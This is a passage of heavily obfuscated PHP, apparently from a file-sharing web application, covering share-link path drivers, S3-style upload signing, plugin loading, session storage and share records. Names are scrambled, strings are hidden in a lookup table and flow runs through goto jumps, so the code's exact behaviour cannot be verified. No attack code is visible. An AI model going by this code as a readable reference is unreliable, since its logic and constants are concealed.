return get_path_this($this->pathParse[$_SERVER[í¤âËÚ£¶íÊ¢][85]]); } public function pathFather($FöÀ‚Ä¸à) { return get_path_father($this->pathParse[$_SERVER[í¤âËÚ£¶íÊ¢][85]]); } public function iconvSystem($CˆŠ®–ÙŒ‰) { return $CˆŠ®–ÙŒ‰; } protected function infoParse($Aâò£™÷Ê‚, $dƒ§‹¿„Åó = false) { $fñ‘µºŞ½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eëàîëÍàÆ = $this->pathParse[$fñ‘µºŞ½[469]][$fñ‘µºŞ½[1031]] . $this->pathParse[$fñ‘µºŞ½[1024]]; if ($dƒ§‹¿„Åó) { $e›­†É®ô = IO::infoWithChildren($eëàîëÍàÆ); } else { $e›­†É®ô = IO::info($eëàîëÍàÆ); } $Fº»·¬áëĞ = $this->pathParse[$fñ‘µºŞ½[469]]; return Action($fñ‘µºŞ½[1173])->_shareItemeParse($e›­†É®ô, $Fº»·¬áëĞ); } public function listAll($DíÊóƒ¦‘–) { $CùĞ„âÎ™½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E´Óõ…å = IO::listAll($DíÊóƒ¦‘–); $EçŠÎØ«â” = $this->pathParse[$CùĞ„âÎ™½[469]]; foreach ($E´Óõ…å as &$eÙƒŞœ£“Ç) { check_abort(); $dÚË¸…±§¥ = IO::info($eÙƒŞœ£“Ç[$CùĞ„âÎ™½[85]]); $dÚË¸…±§¥ = is_array($dÚË¸…±§¥) ? $dÚË¸…±§¥ : array(); $eÙƒŞœ£“Ç = array_merge($dÚË¸…±§¥, $eÙƒŞœ£“Ç); $eÙƒŞœ£“Ç[$CùĞ„âÎ™½[94]] = Action($CùĞ„âÎ™½[1173])->_shareItemeParse($eÙƒŞœ£“Ç, $EçŠÎØ«â”); } unset($eÙƒŞœ£“Ç); return $E´Óõ…å; } public function getPathOuter($E¶§ªó˜›È) { goto cóô¶äÃìì; CŒ£¥˜–ã´: $bê–Ë±‹Á… = KodIO::clear($E¶§ªó˜›È); $aˆù¯‚´Ø = KodIO::clear($this->pathParse[$c‚Çá¨‘·‚[469]][$c‚Çá¨‘·‚[1031]]); $b°¢‹›ÁŞ = substr($bê–Ë±‹Á…, strlen($aˆù¯‚´Ø)); goto DÀê ’ö÷; DÀê ’ö÷: if (substr($bê–Ë±‹Á…, 0, strlen($aˆù¯‚´Ø)) != $aˆù¯‚´Ø) { return !1; } return $this->pathParse[$c‚Çá¨‘·‚[1025]] . $c‚Çá¨‘·‚[8] . ltrim($b°¢‹›ÁŞ, $c‚Çá¨‘·‚[8]); goto C¨‹š·¼Ì¶; cóô¶äÃìì: $c‚Çá¨‘·‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dˆÒ¶â°„¼ = KodIO::parse($E¶§ªó˜›È); if ($dˆÒ¶â°„¼[$c‚Çá¨‘·‚[29]] == KodIO::KOD_SHARE_ITEM) { return $dˆÒ¶â°„¼[$c‚Çá¨‘·‚[85]]; } goto CŒ£¥˜–ã´; C¨‹š·¼Ì¶: } public function getType() { $B¤œÊÓàè =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eñ¡ØŒ„–† = str_replace($B¤œÊÓàè[81], $B¤œÊÓàè[33], get_class($this)); return strtolower($eñ¡ØŒ„–†); } public function isTypeObject($AÍë³Õ­ï¿) { return IO::isTypeObject($AÍë³Õ­ï¿); } public function info($a™Ü‡ÙÎÀ§) { return $this->infoParse($a™Ü‡ÙÎÀ§); } public function infoAuth($E×‰ÇçøˆØ) { return $this->infoParse($E×‰ÇçøˆØ); } public function infoWithChildren($d‘…´¿æ) { return $this->infoParse($d‘…´¿æ, !0); } public function infoFull($b•èÒã´éá) { return $this->infoParse($b•èÒã´éá); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($E¢‡¢·’»Œ) { $this->pathParse = $E¢‡¢·’»Œ; } protected function infoParse($f¹§ Ó¦œ, $Cì¸ ÂÏ‹ù = false) { $C¨˜ÈØçˆ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return Action($C¨˜ÈØçˆ¿[1030])->sharePathInfo($this->pathParse[$C¨˜ÈØçˆ¿[85]], !0, $Cì¸ ÂÏ‹ù); } public function listPath($Fáå¬šÚİ, $FØè÷Ò¾ƒÚ = false) { $CÁØƒ³Ÿï” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÖíÍ“õÈë = IO::listPath($Fáå¬šÚİ, $FØè÷Ò¾ƒÚ); foreach ($EÖíÍ“õÈë as $Aİç¯  È• => $fÏ†–ôß½) { if (!in_array($Aİç¯  È•, array($CÁØƒ³Ÿï”[83], $CÁØƒ³Ÿï”[84]))) { continue; } foreach ($fÏ†–ôß½ as $f©¡Ä¬«—ˆ => $bÛ›±Üñˆ•) { $bÛ›±Üñˆ• = Action($CÁØƒ³Ÿï”[1182])->parsePathChildren($bÛ›±Üñˆ•, array($CÁØƒ³Ÿï”[417] => $Fáå¬šÚİ)); $EÖíÍ“õÈë[$Aİç¯  È•][$f©¡Ä¬«—ˆ] = Action($CÁØƒ³Ÿï”[1030])->shareItemInfo($bÛ›±Üñˆ•); } } return $EÖíÍ“õÈë; } public function listAll($E…±‹Ë¤§Ÿ) { $f¢‡³ª÷†Ş =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÌŠÈÅ±º… = IO::listAll($E…±‹Ë¤§Ÿ); foreach ($AÌŠÈÅ±º… as &$aÀªÍÃïğê) { $F…Îö×¥… = IO::info($aÀªÍÃïğê[$f¢‡³ª÷†Ş[85]]); $F…Îö×¥… = is_array($F…Îö×¥…) ? $F…Îö×¥… : array(); $aÀªÍÃïğê = array_merge($F…Îö×¥…, $aÀªÍÃïğê); $aÀªÍÃïğê[$f¢‡³ª÷†Ş[94]] = Action($f¢‡³ª÷†Ş[1030])->shareItemInfo($aÀªÍÃïğê); } unset($aÀªÍÃïğê); return $AÌŠÈÅ±º…; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($E…¨ÎïÉÇ) { parent::__construct($E…¨ÎïÉÇ); $this->signatureVersion($_SERVER[í¤âËÚ£¶íÊ¢][220]); } public function uploadFormData($eÌßœïÜ«˜, $bïÌæÀÙˆ„ = 3600) { goto FÕœ¯™‹Ç±; Dìç·…ìŠŞ: $eéÕ··ÑÆÍ = $dèñ¬©¥Ê‘[1185]; $F¥½§‹áº‹ = $bïÌæÀÙˆ„ . $dèñ¬©¥Ê‘[33]; $eØ™ÈÕÍ = $dèñ¬©¥Ê‘[1147]; goto dé¢ëÆ¬¾‡; A„¼ÖÏö¶: $e²õ‡ªèáº = hash_hmac($dèñ¬©¥Ê‘[1193], $Bğº³µ­øÍ, $DÑ½í‚¤½â, !0); $Fğ¢àÇøá˜ = hash_hmac($dèñ¬©¥Ê‘[1193], $eéÕ··ÑÆÍ, $e²õ‡ªèáº, !0); $D¿ËáÎåâ = hash_hmac($dèñ¬©¥Ê‘[1193], $BŠ«ˆÀŒ×£, $Fğ¢àÇøá˜); goto Bİªè°‘ñ°; FÕœ¯™‹Ç±: $dèñ¬©¥Ê‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÏƒå•Ø÷• = $dèñ¬©¥Ê‘[200]; $fÈƒï§õ†‹ = $dèñ¬©¥Ê‘[1183]; goto b“Òõ³…Â¨; b“Òõ³…Â¨: $Bğº³µ­øÍ = $dèñ¬©¥Ê‘[69]; $B—¦ŠÕÛÍ„ = gmdate($dèñ¬©¥Ê‘[1184]); $cÜŠØ¶²ë = gmdate($dèñ¬©¥Ê‘[695]); goto Dìç·…ìŠŞ; bÍ†ƒ¨Ú„”: $BŠ«ˆÀŒ×£ = base64_encode(json_encode($Eà—‘ôôø¿)); $a•‚Â‹–è = hash_hmac($dèñ¬©¥Ê‘[1193], $cÜŠØ¶²ë, $dèñ¬©¥Ê‘[1194] . $this->secret, !0); $DÑ½í‚¤½â = hash_hmac($dèñ¬©¥Ê‘[1193], $this->region, $a•‚Â‹–è, !0); goto A„¼ÖÏö¶; Bİªè°‘ñ°: $b†ò„´×Èõ = array($dèñ¬©¥Ê‘[219] => $dèñ¬©¥Ê‘[33], $dèñ¬©¥Ê‘[1195] => $dèñ¬©¥Ê‘[33], $dèñ¬©¥Ê‘[1151] => $FÏƒå•Ø÷•, $dèñ¬©¥Ê‘[1155] => $eØ™ÈÕÍ, $dèñ¬©¥Ê‘[1159] => $BŠ«ˆÀŒ×£, $dèñ¬©¥Ê‘[1196] => $eìèîİ¤™, $dèñ¬©¥Ê‘[1197] => $fÈƒï§õ†‹, $dèñ¬©¥Ê‘[1198] => $B—¦ŠÕÛÍ„, $dèñ¬©¥Ê‘[1199] => $F¥½§‹áº‹, $dèñ¬©¥Ê‘[1200] => $D¿ËáÎåâ, $dèñ¬©¥Ê‘[184] => $this->getHost()); return $b†ò„´×Èõ; goto F÷æåéŠç; dé¢ëÆ¬¾‡: $càÔÂĞÕ“ = array($this->accessKey, $cÜŠØ¶²ë, $this->region, $Bğº³µ­øÍ, $eéÕ··ÑÆÍ); $eìèîİ¤™ = implode($dèñ¬©¥Ê‘[8], $càÔÂĞÕ“); $Eà—‘ôôø¿ = array($dèñ¬©¥Ê‘[1149] => gmdate($dèñ¬©¥Ê‘[1148], strtotime($dèñ¬©¥Ê‘[1186])), $dèñ¬©¥Ê‘[1150] => array(array($dèñ¬©¥Ê‘[1152] => $this->bucket), array($dèñ¬©¥Ê‘[1151] => $FÏƒå•Ø÷•), array($dèñ¬©¥Ê‘[1153], $dèñ¬©¥Ê‘[1154], $dèñ¬©¥Ê‘[33]), array($dèñ¬©¥Ê‘[1153], $dèñ¬©¥Ê‘[1187], $dèñ¬©¥Ê‘[33]), array($dèñ¬©¥Ê‘[1153], $dèñ¬©¥Ê‘[1188], $dèñ¬©¥Ê‘[33]), array($dèñ¬©¥Ê‘[1155] => $eØ™ÈÕÍ), array($dèñ¬©¥Ê‘[1189] => $eìèîİ¤™), array($dèñ¬©¥Ê‘[1190] => $fÈƒï§õ†‹), array($dèñ¬©¥Ê‘[1191] => $B—¦ŠÕÛÍ„), array($dèñ¬©¥Ê‘[1192] => $F¥½§‹áº‹))); goto bÍ†ƒ¨Ú„”; F÷æåéŠç: } } goto eÊâƒ²ÆåÊ; A¬é¢¾Úà: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\160\x6c\x75\x67\x69\x6e\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\164\x61\164\165\163", "\162\145\x67\x69\145\x73\x74", "\x63\x6f\x6e\146\151\147"); public function loadList($a†³„¸½Æ¦ = false) { $aˆº·¯« = array_to_keyvalue($this->listData(), $_SERVER[í¤âËÚ£¶íÊ¢][28]); if ($a†³„¸½Æ¦) { return $aˆº·¯«[$a†³„¸½Æ¦]; } return $aˆº·¯«; } public function init() { $bÒ£…Ï‘‰Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; Hook::trigger($bÒ£…Ï‘‰Ù[1762]); $fÒ…”¾­‰§ = $this->loadPluginList(); foreach ($fÒ…”¾­‰§ as $b”±ëÑ ™ => $Dè‰·²…¾·) { $Eô¢¡©„Óæ = $this->appAllow($b”±ëÑ ™, $Dè‰·²…¾·); if (!$Eô¢¡©„Óæ) { continue; } foreach ($Dè‰·²…¾·[$bÒ£…Ï‘‰Ù[1763]] as $cğí•¸ÁÀ¥ => $aÃ…°¤²ç) { Hook::bind($cğí•¸ÁÀ¥, $aÃ…°¤²ç); } } Hook::trigger($bÒ£…Ï‘‰Ù[1764]); Hook::trigger(ACTION); } public function appAllow($Fù­÷©·øè, $a†ïê½Æ®£, $b“ƒğƒí¯– = true) { $dºñ„š™í® =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÁãíöï—÷ = PLUGIN_DIR . $Fù­÷©·øè . $dºñ„š™í®[1765]; if (!is_array($a†ïê½Æ®£) || !is_array($a†ïê½Æ®£[$dºñ„š™í®[1763]]) || $a†ïê½Æ®£[$dºñ„š™í®[694]] != 1 || !is_file($BÁãíöï—÷)) { return !1; } if ($GLOBALS[$dºñ„š™í®[488]] == 1) { return !0; } if ($b“ƒğƒí¯– && !Action($dºñ„š™í®[1766])->checkAuth($Fù­÷©·øè)) { return !1; } return !0; } public function unInstall($E±ÔÛÌùÎ ) { $d«Î¶ƒ…¨æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f‰§‹ö‡Á = $this->loadList($E±ÔÛÌùÎ ); if (file_exists(PLUGIN_DIR . $E±ÔÛÌùÎ )) { Hook::apply($E±ÔÛÌùÎ  . $d«Î¶ƒ…¨æ[1767]); } $this->remove($f‰§‹ö‡Á[$d«Î¶ƒ…¨æ[397]]); } public function changeStatus($BÀƒÒÙéƒ , $e¨ºÎ›©¦) { $cëÌĞé÷ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bë„óˆôŞ‘ = $this->loadList($BÀƒÒÙéƒ ); if ($e¨ºÎ›©¦) { Hook::apply($BÀƒÒÙéƒ  . $cëÌĞé÷ò[1768]); } $this->update($bë„óˆôŞ‘[$cëÌĞé÷ò[397]], array($cëÌĞé÷ò[1769] => $e¨ºÎ›©¦)); } public function appRegist($fãƒæéÒ¾½, $Dé»†Éº) { $eïÙŠÎÜŒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E¾ƒ”÷‰ğ¡ = $this->loadList($fãƒæéÒ¾½); if ($E¾ƒ”÷‰ğ¡) { $this->update($E¾ƒ”÷‰ğ¡[$eïÙŠÎÜŒ[397]], array($eïÙŠÎÜŒ[1763] => $Dé»†Éº)); } else { $dÚ³öõó­  = array($eïÙŠÎÜŒ[28] => $fãƒæéÒ¾½, $eïÙŠÎÜŒ[1763] => $Dé»†Éº, $eïÙŠÎÜŒ[694] => 0, $eïÙŠÎÜŒ[6] => $this->getConfigDefault($fãƒæéÒ¾½)); $this->insert($dÚ³öõó­ ); } } public function getConfigDefault($B‘§á°Ÿ¹¥) { $aÒøëç»´¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a®èÍï‚»Õ = array(); $fÊ¿Í½©ìÃ = $this->getPackageJson($B‘§á°Ÿ¹¥); if (!$fÊ¿Í½©ìÃ && is_array($fÊ¿Í½©ìÃ[$aÒøëç»´¡[1770]])) { return $a®èÍï‚»Õ; } foreach ($fÊ¿Í½©ìÃ[$aÒøëç»´¡[1770]] as $f†“‚ÎÅƒ => $fÖåíÙµÆ°) { if (!isset($fÖåíÙµÆ°[$aÒøëç»´¡[380]]) || isset($a®èÍï‚»Õ[$f†“‚ÎÅƒ])) { continue; } $a®èÍï‚»Õ[$f†“‚ÎÅƒ] = $fÖåíÙµÆ°[$aÒøëç»´¡[380]]; } return $a®èÍï‚»Õ; } public function getPackageJson($c×„îÙ“Á) { return Hook::apply($c×„îÙ“Á . $_SERVER[í¤âËÚ£¶íÊ¢][1771]); } public function getConfig($CÓÁŞÎ¿, $a‡èˆ¹æ‡š = false) { $AÖ•Ò¹›½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dôØ¿àî¶ = array(); $EÇÙÊôÈ¨’ = $this->loadList($CÓÁŞÎ¿); if ($EÇÙÊôÈ¨’ && is_array($EÇÙÊôÈ¨’[$AÖ•Ò¹›½[6]])) { $dôØ¿àî¶ = $EÇÙÊôÈ¨’[$AÖ•Ò¹›½[6]]; } if (!$dôØ¿àî¶ || $a‡èˆ¹æ‡š) { $dôØ¿àî¶ = $this->getConfigDefault($CÓÁŞÎ¿); } return $dôØ¿àî¶; } public function setConfig($cÚÈöµ‰÷, $FËùâäî§ø = false) { goto BŠŠƒ–ºÊ¹; BŠŠƒ–ºÊ¹: $b®ë‹¿îÈÌ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E“–µİ”âÕ = $this->loadList($cÚÈöµ‰÷); if (!$E“–µİ”âÕ) { return !1; } goto bÄ¼¹ ¥¤; E¦ÇÉÊÄĞ¤: $this->update($E“–µİ”âÕ[$b®ë‹¿îÈÌ[397]], array($b®ë‹¿îÈÌ[6] => $eÇÉ÷˜×¡â)); goto eã…’”Õ¦Õ; bÄ¼¹ ¥¤: $eÇÉ÷˜×¡â = $E“–µİ”âÕ[$b®ë‹¿îÈÌ[6]]; if ($FËùâäî§ø == !1) { $eÇÉ÷˜×¡â = array(); $FËùâäî§ø = $this->getConfigDefault($cÚÈöµ‰÷); } foreach ($FËùâäî§ø as $C”°ãÑ–ß => $f¸•»¢‚í) { $eÇÉ÷˜×¡â[$C”°ãÑ–ß] = is_string($f¸•»¢‚í) ? trim($f¸•»¢‚í) : $f¸•»¢‚í; } goto E¦ÇÉÊÄĞ¤; eã…’”Õ¦Õ: } public function viewList() { goto A÷Œ–å¶°«; cÏá“ÓòŒ‹: return $fİµö²››; goto d‹­·²â; A÷Œ–å¶°«: $C–íÒ¯ÃÄ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aŒŒ¦Ô’ÆŸ = $this->loadList(); $this->pluginScan($aŒŒ¦Ô’ÆŸ); goto C»éµŸ˜ªì; C»éµŸ˜ªì: $aŒŒ¦Ô’ÆŸ = $this->loadPluginList(); $fİµö²›› = array(); foreach ($aŒŒ¦Ô’ÆŸ as $d¶¦ÒÒ÷ => $aËˆí½¿§) { unset($aËˆí½¿§[$C–íÒ¯ÃÄ[1763]], $aËˆí½¿§[$C–íÒ¯ÃÄ[6]]); $e¶´Öù¿‘î = PLUGIN_DIR . $aËˆí½¿§[$C–íÒ¯ÃÄ[28]] . $C–íÒ¯ÃÄ[1765]; if (!is_file($e¶´Öù¿‘î)) { continue; } $b–êĞîã¼³ = Hook::apply($aËˆí½¿§[$C–íÒ¯ÃÄ[28]] . $C–íÒ¯ÃÄ[1771]); if (is_array($b–êĞîã¼³)) { $fİµö²››[$d¶¦ÒÒ÷] = array_merge($aËˆí½¿§, $b–êĞîã¼³); } } goto cÏá“ÓòŒ‹; d‹­·²â: } private function loadPluginList() { $eë’†´¤æˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÒÜïãì–‡ = $this->loadList(); if (strtolower(MOD) == $eë’†´¤æˆ[1772]) { return $cÒÜïãì–‡; } $Cœ‚ß½¥ä¡ = Hook::trigger($eë’†´¤æˆ[1773], $cÒÜïãì–‡); if ($cÒÜïãì–‡ && !$Cœ‚ß½¥ä¡) { die; } return $Cœ‚ß½¥ä¡ ? $Cœ‚ß½¥ä¡ : $cÒÜïãì–‡; } private function pluginScan($dªÈĞ¸’‚) { $aÉÂ±··  =& $_SERVER[í¤âËÚ£¶íÊ¢]; recursion_dir(PLUGIN_DIR, $Bğ¨‚ßŞÑ, $e³ƒÚÃÌ§’, 0); foreach ($Bğ¨‚ßŞÑ as $EáÊ¥¦µÎæ) { $BÛçË¤ïî = get_path_this($EáÊ¥¦µÎæ); if (isset($dªÈĞ¸’‚[$BÛçË¤ïî]) || !file_exists($EáÊ¥¦µÎæ . $aÉÂ±·· [1774]) || !file_exists($EáÊ¥¦µÎæ . $aÉÂ±·· [1765])) { continue; } Hook::apply($BÛçË¤ïî . $aÉÂ±·· [1768]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\137\x73\145\163\163\x69\x6f\156"; public function get($F Ÿ„í‚Ø) { $C¹öà”‡‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¾®âÇÑ‰¬ = $this->where(array($C¹öà”‡‰[1775] => $F Ÿ„í‚Ø))->find(); if (!is_array($e¾®âÇÑ‰¬)) { return !1; } return $e¾®âÇÑ‰¬[$C¹öà”‡‰[697]]; } public function set($EÙà¤‘İší, $aÅè›õª”¨, $f½ö¼¶¨«ç = 3600) { $bäÅ÷†ÀØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F‡‘°ë‹‰¼ = array($bäÅ÷†ÀØ[1775] => $EÙà¤‘İší, $bäÅ÷†ÀØ[1683] => $aÅè›õª”¨, $bäÅ÷†ÀØ[1776] => $f½ö¼¶¨«ç + time()); if (Session::get($bäÅ÷†ÀØ[1777])) { $F‡‘°ë‹‰¼[$bäÅ÷†ÀØ[1487]] = Session::get($bäÅ÷†ÀØ[1777]); } else { $F‡‘°ë‹‰¼[$bäÅ÷†ÀØ[1487]] = 0; } if ($this->get($EÙà¤‘İší)) { return $this->where(array($bäÅ÷†ÀØ[1775] => $EÙà¤‘İší))->save($F‡‘°ë‹‰¼); } else { return $this->add($F‡‘°ë‹‰¼, array(), !0); } } public function remove($fœ©µ¤ÙÆõ) { return $this->where(array($_SERVER[í¤âËÚ£¶íÊ¢][1775] => $fœ©µ¤ÙÆõ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[í¤âËÚ£¶íÊ¢][1778] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\x73\x65\x72\164\54\x75\160\144\x61\x74\145", "\146\165\x6e\x63\x74\x69\157\x6e"), array("\x63\x72\145\141\164\x65\124\151\155\x65", "\164\151\155\x65", "\151\x6e\163\145\162\164", "\146\x75\156\143\164\151\x6f\156"), array("\x6f\x70\164\x69\157\x6e\163", '', "\x69\156\x73\145\x72\x74\x2c\165\160\x64\x61\164\145\x2c\163\145\154\145\x63\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($D£çÌ¼ğ¬ğ) { $fŒ¬†Â„æë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Fİ¢”ƒ–ç = isset($D£çÌ¼ğ¬ğ[0]) ? $D£çÌ¼ğ¬ğ[0] : !1; return array($fŒ¬†Â„æë[1779] => array(USER_ID, $fŒ¬†Â„æë[1780]), $fŒ¬†Â„æë[1723] => array($Fİ¢”ƒ–ç, $fŒ¬†Â„æë[1781])); } protected function listSimple() { $AÎ»‘âÓàÖ = array($_SERVER[í¤âËÚ£¶íÊ¢][1487] => USER_ID); $A¬™ãŒ— = $this->field($this->fieldList)->where($AÎ»‘âÓàÖ)->select(); return $A¬™ãŒ— ? $A¬™ãŒ— : array(); } protected function getInfo($bíĞ»ÑéæÙ, $BºÒ©Ë‰‰ = false) { $DçÃÇŠêñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($BºÒ©Ë‰‰) { return $this->_getShareInfo(array($DçÃÇŠêñ[471] => $bíĞ»ÑéæÙ)); } $b†ì¾…õøÑ = $this->cacheFunctionGet($DçÃÇŠêñ[1730], $bíĞ»ÑéæÙ); return $b†ì¾…õøÑ; } public function getInfoByHash($Fæï»¬ĞÎ‹) { return $this->_getShareInfo(array($_SERVER[í¤âËÚ£¶íÊ¢][473] => $Fæï»¬ĞÎ‹)); } public function getInfoByPath($Bª¦Ïìº®) { $A–ª°»¡ÈÌ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fìØ„’Õ¿ = array($A–ª°»¡ÈÌ[1487] => USER_ID, $A–ª°»¡ÈÌ[399] => $Bª¦Ïìº®); return $this->_getShareInfo($fìØ„’Õ¿); } public function getInfoBySourcePath($EÃÔ¶”®â) { $eñ£æ¼˜ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B½¶º½ñÔ = array($eñ£æ¼˜ˆ[1487] => USER_ID, $eñ£æ¼˜ˆ[1031] => $EÃÔ¶”®â); return $this->_getShareInfo($B½¶º½ñÔ); } private function _getShareInfo($AçÀøÈƒ¾¨) { goto cï‘…”à–; c¤±çæ…ì: if ($AÎ½ È²¸[$Fè‚ó©ƒ¿Û[399]] == $Fè‚ó©ƒ¿Û[500]) { $AÎ½ È²¸[$Fè‚ó©ƒ¿Û[94]] = IO::info($AÎ½ È²¸[$Fè‚ó©ƒ¿Û[1031]]); } else { $AÎ½ È²¸[$Fè‚ó©ƒ¿Û[94]] = Model($Fè‚ó©ƒ¿Û[1164])->pathInfo($AÎ½ È²¸[$Fè‚ó©ƒ¿Û[399]]); } $AÎ½ È²¸[$Fè‚ó©ƒ¿Û[1783]] = $dÃÅïäœŠ±; return $AÎ½ È²¸; goto f×…•×¬òÅ; f¹§Ú¸”ˆï: $AçÀøÈƒ¾¨ = array($Fè‚ó©ƒ¿Û[471] => $AÎ½ È²¸[$Fè‚ó©ƒ¿Û[471]]); $få±Ñ²ÔêÃ = $Fè‚ó©ƒ¿Û[1782]; $dÃÅïäœŠ± = Model($Fè‚ó©ƒ¿Û[568])->order($Fè‚ó©ƒ¿Û[397])->field($få±Ñ²ÔêÃ)->where($AçÀøÈƒ¾¨)->select(); goto c¤±çæ…ì; cï‘…”à–: $Fè‚ó©ƒ¿Û =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÎ½ È²¸ = $this->where($AçÀøÈƒ¾¨)->find(); if (!$AÎ½ È²¸) { return !1; } goto f¹§Ú¸”ˆï; f×…•×¬òÅ: } protected function getInfoAuth($d‘Ó‹ÉÏÄ‚) { $a¸Õ–Ğé =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B­¢÷Ä­Æ = $this->getInfo($d‘Ó‹ÉÏÄ‚); $B­¢÷Ä­Æ[$a¸Õ–Ğé[409]] = Model($a¸Õ–Ğé[485])->authMake($B­¢÷Ä­Æ[$a¸Õ–Ğé[1783]]); return $B­¢÷Ä­Æ; } protected function listData($BÕš¹œÍ¬Ã = null, $dÜÕÈÈå« = 300) { $B’´Á…« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¸‡£ã©ÆØ = array(array($B’´Á…«[476] => array($B’´Á…«[930], 0), $B’´Á…«[478] => array($B’´Á…«[930], 0), $B’´Á…«[1784] => $B’´Á…«[1738])); if ($BÕš¹œÍ¬Ã == $B’´Á…«[1785]) { $c¸‡£ã©ÆØ = array($B’´Á…«[476] => 1); } else { if ($BÕš¹œÍ¬Ã == $B’´Á…«[1016]) { $c¸‡£ã©ÆØ = array($B’´Á…«[478] => 1); } } $c¸‡£ã©ÆØ[$B’´Á…«[1487]] = USER_ID; $F§Ô‘–÷µ = $this->where($c¸‡£ã©ÆØ)->selectPage($dÜÕÈÈå«); return $F§Ô‘–÷µ; } protected function listToMe($a°Œøë÷± = 300) { goto EŞã†ƒ óË; EÚ ¿ï§Å¹: if ($fáàØ´…ğÌ) { $FÇÖÉºÚ¡¯ = array(array($Dá¬ó£âêÃ[553] => SourceModel::TYPE_USER, $Dá¬ó£âêÃ[487] => USER_ID), array($Dá¬ó£âêÃ[553] => SourceModel::TYPE_GROUP, $Dá¬ó£âêÃ[487] => array($Dá¬ó£âêÃ[7], $fáàØ´…ğÌ)), $Dá¬ó£âêÃ[1784] => $Dá¬ó£âêÃ[1738]); } $F´Í‡Ú…¦¨ = Model($Dá¬ó£âêÃ[568])->where($FÇÖÉºÚ¡¯)->selectPage($a°Œøë÷±); $C‰³Ğ¸ñ¢˜ = array_to_keyvalue_group($F´Í‡Ú…¦¨[$Dá¬ó£âêÃ[375]], $Dá¬ó£âêÃ[471]); goto C†îœÄÌ•; EŞã†ƒ óË: $Dá¬ó£âêÃ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fáàØ´…ğÌ = Model($Dá¬ó£âêÃ[1786])->userGroupParents(USER_ID); $FÇÖÉºÚ¡¯ = array($Dá¬ó£âêÃ[553] => SourceModel::TYPE_USER, $Dá¬ó£âêÃ[487] => USER_ID); goto EÚ ¿ï§Å¹; f„›«ù¹¥Î: $f„“¬Š³ËÒ = $this->field($døÒ¿½µ’º)->where($FÇÖÉºÚ¡¯)->select(); foreach ($f„“¬Š³ËÒ as $D¯³™Ù©‰Ş => &$C±Å§ø×‚) { $C±Å§ø×‚[$Dá¬ó£âêÃ[1783]] = $C‰³Ğ¸ñ¢˜[$C±Å§ø×‚[$Dá¬ó£âêÃ[471]]]; } unset($C±Å§ø×‚); goto aòÇÑãŞ–ô; aòÇÑãŞ–ô: $e¬ŠÖ÷££‹ = array($Dá¬ó£âêÃ[1788] => $f„“¬Š³ËÒ, $Dá¬ó£âêÃ[1789] => $F´Í‡Ú…¦¨[$Dá¬ó£âêÃ[372]]); return $e¬ŠÖ÷££‹; goto B èÛæ¦‘ñ; C†îœÄÌ•: if (!$C‰³Ğ¸ñ¢˜) { return $F´Í‡Ú…¦¨; } $døÒ¿½µ’º = $Dá¬ó£âêÃ[1787]; $FÇÖÉºÚ¡¯ = array($Dá¬ó£âêÃ[471] => array($Dá¬ó£âêÃ[414], array_keys($C‰³Ğ¸ñ¢˜))); goto f„›«ù¹¥Î; B èÛæ¦‘ñ: } protected function shareAdd($aš–‚Å›, $fÈ†£¼ø‹”) { $Eœ§ª˜çØÒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dõßï£åè = $this->_addShareData($aš–‚Å›, $fÈ†£¼ø‹”); if (!empty($fÈ†£¼ø‹”[$Eœ§ª˜çØÒ[1790]])) { $this->_shareAuthSet($Dõßï£åè, $fÈ†£¼ø‹”[$Eœ§ª˜çØÒ[1790]]); } $this->shareEventAdd($aš–‚Å›, $fÈ†£¼ø‹”, $Eœ§ª˜çØÒ[1019]); return $Dõßï£åè; } private function shareEventAdd($dõÊ­»­‘‘, $f®ËªÒñ, $f²Œ„Œˆ­• = "\141\x64\x64") { goto AìŠñŠ ØÈ; D•¾æ•Éâ: if ($f§Ä©à¼©Ğ[$E¤×Œº¾ƒ·[478]] == $E¤×Œº¾ƒ·[500] && $f®ËªÒñ[$E¤×Œº¾ƒ·[478]] == $E¤×Œº¾ƒ·[96]) { $eîŒËÁğÈ¼ = $E¤×Œº¾ƒ·[1792]; } if ($f§Ä©à¼©Ğ[$E¤×Œº¾ƒ·[478]] == $E¤×Œº¾ƒ·[96] && $f®ËªÒñ[$E¤×Œº¾ƒ·[478]] == $E¤×Œº¾ƒ·[500]) { 